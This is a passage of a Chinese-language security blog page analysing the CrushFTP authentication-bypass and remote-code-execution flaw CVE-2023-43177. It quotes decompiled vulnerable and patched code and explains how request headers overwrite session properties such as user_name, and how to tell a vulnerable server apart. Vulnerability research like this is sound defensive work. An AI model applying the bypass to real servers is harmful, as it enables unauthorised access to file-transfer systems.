<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=5"><meta name="description" content="CrushFTP  Unauthenticated Remote Code Execution路由分析不像传统套件，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活，在crushftp.server.ServerSessionHTTP可以看到具体的处理过程，代码”依托答辩”，不过漏洞思路值得学习  前台权限绕过简单来说，原理是因为程序实现存在匿名访问机制，并且可以通过header污染当前会"><meta property="og:type" content="article"><meta property="og:title" content="CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><meta property="og:url" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/index.html"><meta property="og:site_name" content="Y4tacker:Hacking The World!"><meta property="og:description" content="CrushFTP  Unauthenticated Remote Code Execution路由分析不像传统套件，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活，在crushftp.server.ServerSessionHTTP可以看到具体的处理过程，代码”依托答辩”，不过漏洞思路值得学习  前台权限绕过简单来说，原理是因为程序实现存在匿名访问机制，并且可以通过header污染当前会"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211184136935.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210231729940.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210234410800.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211185653980.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210235316865.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211001218626.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211000554219.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211130810142.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211131426907.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132022476.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133549918.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211133757762.png"><meta property="og:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211132908890.png"><meta property="article:published_time" content="2023-12-10T13:04:09.000Z"><meta property="article:modified_time" content="2024-08-04T09:01:49.794Z"><meta property="article:author" content="Y4tacker"><meta property="article:tag" content="Java"><meta property="article:tag" content="CrushFTP"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211184136935.png"><link rel="shortcut icon" href="/images/favicon.ico"><link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><title>CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)</title><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 5.4.1"><link rel="alternate" href="/atom.xml" title="Y4tacker:Hacking The World!" type="application/atom+xml"></head><body class="max-width mx-auto px3 ltr"><div id="header-post"><a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" aria-label="Top" onclick='$("html, body").animate({scrollTop:0},"fast")' style="display:none"><i class="fa-solid fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archives/">Writing</a></li><li><a href="/tags/">Topics</a></li><li><a href="/search/">Search</a></li><li><a href="/about/">About</a></li><li><a href="/link/">Friends</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" aria-label="Previous post" href="/2023/12/13/year/2023/12/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle()' onmouseout='$("#i-prev").toggle()'></i></a></li><li><a class="icon" aria-label="Next post" href="/2023/12/09/year/2023/12/Apache-Struts2-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E5%88%86%E6%9E%90-S2-066/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle()' onmouseout='$("#i-next").toggle()'></i></a></li><li><a class="icon" aria-label="Back to top" href="#" onclick='$("html, body").animate({scrollTop:0},"fast")'><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle()' onmouseout='$("#i-top").toggle()'></i></a></li><li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle()' onmouseout='$("#i-share").toggle()' onclick='return $("#share").toggle(),!1'></i></a></li></ul><span id="i-prev" class="info" style="display:none">Previous post</span> <span id="i-next" class="info" style="display:none">Next post</span> <span id="i-top" class="info" style="display:none">Back to top</span> <span id="i-share" class="info" style="display:none">Share post</span></span><br><div id="share" style="display:none"><ul><li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/"><i class="fab fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&text=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&is_video=false&description=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)&body=Check out this article: https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/"><i class="fa-solid fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&title=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-digg" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&name=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)&description="><i class="fab fa-tumblr" aria-hidden="true"></i></a></li><li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://y4tacker.github.io/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/&t=CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)"><i class="fab fa-hacker-news" aria-hidden="true"></i></a></li></ul></div><div id="toc"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CrushFTP-Unauthenticated-Remote-Code-Execution"><span class="toc-number">1.</span> <span class="toc-text">CrushFTP Unauthenticated Remote Code Execution</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E5%88%86%E6%9E%90"><span class="toc-number">1.1.</span> <span class="toc-text">路由分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E5%8F%B0%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.</span> <span class="toc-text">前台权限绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">后台代码执行</span></a></li></ol></li></ol></div></span></div><div class="content index py4"><article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle p-name" itemprop="name headline">CrushFTP Unauthenticated Remote Code Execution(CVE-2023-43177)</h1><div class="meta"><span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-name" itemprop="name">Y4tacker</span></span><div class="postdate"><time datetime="2023-12-10T13:04:09.000Z" class="dt-published" itemprop="datePublished">2023-12-10</time> (Updated: <time datetime="2024-08-04T09:01:49.794Z" class="dt-updated" itemprop="dateModified">2024-08-04</time>)</div><div class="article-category"><i class="fa-solid fa-archive"></i> <a class="category-link" href="/categories/Java/">Java</a></div><div class="article-tag"><i class="fa-solid fa-tag"></i> <a class="p-category" href="/tags/CrushFTP/" rel="tag">CrushFTP</a>, <a class="p-category" href="/tags/Java/" rel="tag">Java</a></div></div></header><div class="content e-content" itemprop="articleBody"><h1 id="CrushFTP-Unauthenticated-Remote-Code-Execution"><a href="#CrushFTP-Unauthenticated-Remote-Code-Execution" class="headerlink" title="CrushFTP  Unauthenticated Remote Code Execution"></a>CrushFTP Unauthenticated Remote Code Execution</h1><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>不像传统套件，这里自己实现了协议的解析并做调用，写法比较死板，不够灵活，在<code>crushftp.server.ServerSessionHTTP</code>可以看到具体的处理过程，代码”依托答辩”，不过漏洞思路值得学习</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231211184136935.png" alt="image-20231211184136935"></p><h2 id="前台权限绕过"><a href="#前台权限绕过" class="headerlink" title="前台权限绕过"></a>前台权限绕过</h2><p>简单来说，原理是因为程序实现存在匿名访问机制，并且可以通过header污染当前会话的参数导致产生了一些意外的操作</p><p>在<code>crushftp.server.ServerSessionAJAX#buildPostItem</code>当中，可以看到会解析每一个header，并将解析到的key,val保存到as2Info这个Properties中，同时这里对put的参数没有任何限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">buildPostItem</span><span class="params">(Properties request, <span class="keyword">long</span> http_len_max, Vector headers, String req_id)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Properties as2Info = <span class="keyword">new</span> Properties();  </span><br><span class="line">        <span class="keyword">boolean</span> write100Continue = <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">int</span> x = <span class="number">1</span>;<span class="function">s</span></span><br><span class="line"><span class="function">        <span class="title">while</span> <span class="params">(x &lt; headers.size()</span>) </span>&#123;</span><br><span class="line">            String data;</span><br><span class="line">            String key = data = headers.elementAt(x).toString();</span><br><span class="line">            String val = <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                val = data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim();</span><br><span class="line">                key = data.substring(<span class="number">0</span>, data.indexOf(<span class="string">&quot;:&quot;</span>)).trim().toLowerCase();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;HTTP_SERVER&quot;</span>, <span class="number">3</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line">            as2Info.put(key, val);  </span><br><span class="line">......省略.....</span><br></pre></td></tr></table></figure><p>我们顺便看看新版本是如何解决这一点的，从<code>processAs2HeaderLine</code>可以看出，允许设置到as2Info当中值受到了限制</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">processAs2HeaderLine</span><span class="params">(String key, String val, String data, Properties as2Info)</span> </span>&#123;</span><br><span class="line">        as2Info.put(key.trim().toLowerCase(), val.trim());</span><br><span class="line">        <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;message-id:&quot;</span>)) &#123;</span><br><span class="line">            String as2Filename = data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim();</span><br><span class="line">            <span class="keyword">if</span> ((as2Filename = as2Filename.substring(<span class="number">1</span>)).indexOf(<span class="string">&quot;@&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                as2Filename = as2Filename.substring(<span class="number">0</span>, as2Filename.indexOf(<span class="string">&quot;@&quot;</span>));</span><br><span class="line">            &#125;</span><br><span class="line">            as2Filename = Common.replace_str(as2Filename, <span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            as2Filename = Common.replace_str(as2Filename, <span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            as2Info.put(<span class="string">&quot;as2Filename&quot;</span>, as2Filename);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;content-type:&quot;</span>)) &#123;</span><br><span class="line">            as2Info.put(<span class="string">&quot;contentType&quot;</span>, data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim());</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (data.toLowerCase().startsWith(<span class="string">&quot;disposition-notification-options:&quot;</span>)) &#123;</span><br><span class="line">            as2Info.put(<span class="string">&quot;signMdn&quot;</span>, String.valueOf(data.substring(data.indexOf(<span class="string">&quot;:&quot;</span>) + <span class="number">1</span>).trim().indexOf(<span class="string">&quot;pkcs7-signature&quot;</span>) &gt;= <span class="number">0</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>继续往下接下来我们可以看到，在光标处没有做任何的限制，直接将as2Info中的每个键值对添加到了当前会话的user_info属性，因此这里存在一个属性覆盖的问题，接下来我们就需要看看覆盖哪些属性可能存在威胁</p><p><img src="/2023/12/10/year/2023/12/CrushFTP-Unauthenticated-Remote-Code-Execution-CVE-2023-43177/image-20231210231729940.png" alt="image-20231210231729940"></p><p>关于user_info属性的获取是通过一个封装好的函数来做获取</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">uiSG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.user_info.containsKey(data)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.user_info.getProperty(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时在此基础上还有一系列类型转换的封装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">uiIG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Integer.parseInt(<span class="keyword">this</span>.uiSG(data));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">uiLG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Long.parseLong(<span class="keyword">this</span>.uiSG(data));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0L</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">uiBG</span><span class="params">(String data)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.uiSG(data).toLowerCase().equals(<span class="string">&quot;true&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure><p>接下来就是寻找污染哪些属性可能造成危害，这里漏洞发现者使用了<code>getUserName</code></p><p>其中csrf默认为true，我们需要传入c2f参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">getUserName</span><span class="params">(Properties request)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (request.getProperty(<span class="string">&quot;command&quot;</span>, <span class="string">&quot;&quot;</span>).equalsIgnoreCase(<span class="string">&quot;getUserName&quot;</span>)) &#123;</span><br><span class="line">        String response = <span class="string">&quot;&lt;?xml version=\&quot;1.0\&quot; encoding=\&quot;UTF-8\&quot;?&gt; \r\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (ServerStatus.BG(<span class="string">&quot;csrf&quot;</span>) &amp;&amp; !request.getProperty(<span class="string">&quot;c2f&quot;</span>, <span class="string">&quot;&quot;</span>).equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            String session_id = <span class="keyword">this</span>.thisSessionHTTP.thisSession.getId();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (!request.getProperty(<span class="string">&quot;c2f&quot;</span>, <span class="string">&quot;&quot;</span>).equalsIgnoreCase(session_id.substring(session_id.length() - <span class="number">4</span>))) &#123;</span><br><span class="line">                    <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiVG(<span class="string">&quot;failed_commands&quot;</span>).addElement(<span class="string">&quot;&quot;</span> + <span class="keyword">new</span> Date().getTime());</span><br><span class="line">                    response = String.valueOf(response) + <span class="string">&quot;&lt;commandResult&gt;&lt;response&gt;FAILURE:Access Denied. (c2f)&lt;/response&gt;&lt;/commandResult&gt;&quot;</span>;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                Log.log(<span class="string">&quot;HTTP_SERVER&quot;</span>, <span class="number">2</span>, e);</span><br><span class="line">                <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiVG(<span class="string">&quot;failed_commands&quot;</span>).addElement(<span class="string">&quot;&quot;</span> + <span class="keyword">new</span> Date().getTime());</span><br><span class="line">                response = String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        response = <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiBG(<span class="string">&quot;user_logged_in&quot;</span>) &amp;&amp; !<span class="keyword">this</span>.thisSessionHTTP.thisSession.uiSG(<span class="string">&quot;user_name&quot;</span>).equals(<span class="string">&quot;&quot;</span>) ? String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;success&lt;/response&gt;&lt;username&gt;&quot;</span> + <span class="keyword">this</span>.thisSessionHTTP.thisSession.uiSG(<span class="string">&quot;user_name&quot;</span>) + <span class="string">&quot;&lt;/username&gt;&lt;/loginResult&gt;&quot;</span> : String.valueOf(response) + <span class="string">&quot;&lt;loginResult&gt;&lt;response&gt;failure&lt;/response&gt;&lt;/loginResult&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果相等则返回登录成功，同时值得注意的是这里会返回<code>user_name</code>，因此我们可以利用这一点来判断漏洞是否可利用，如果是漏洞版本<code>user_name</code>就可以通过header覆盖，返回也可以是任意可控字符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, <span class="keyword">true</span>, <span class="number">200</span>, <span class="keyword">true</span>, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> json)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, <span class="keyword">true</span>, <span class="number">200</span>, <span class="keyword">true</span>, json, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> log, <span class="keyword">int</span> code, <span class="keyword">boolean</span> convertVars, <span class="keyword">boolean</span> json, <span class="keyword">boolean</span> log_header)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">boolean</span> acceptsGZIP = <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.writeResponse(response, log, code, convertVars, json, acceptsGZIP, log_header);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">writeResponse</span><span class="params">(String response, <span class="keyword">boolean</span> log, <span class="keyword">int</span> code, <span class="keyword">boolean</span> convertVars, <span class="keyword">boolean</span> json, <span class="keyword">boolean</span> acceptsGZIP, <span class="keyword">boolean</span> log_header)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (convertVars) &#123;</span><br><span class="line">        response = ServerStatus.thisObj.change_vars_to_values(response, <span class="keyword">this</span>.thisSessionHTTP.thisSession);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;HTTP/1.1 &quot;</span> + code + <span class="string">&quot; OK&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Cache-Control: no-store&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Pragma: no-cache&quot;</span>, log_header);</span><br><span class="line">    <span class="keyword">if</span> (json) &#123;</span><br><span class="line">        <span class="keyword">this</span>.write_command_http(<span class="string">&quot;Content-Type: 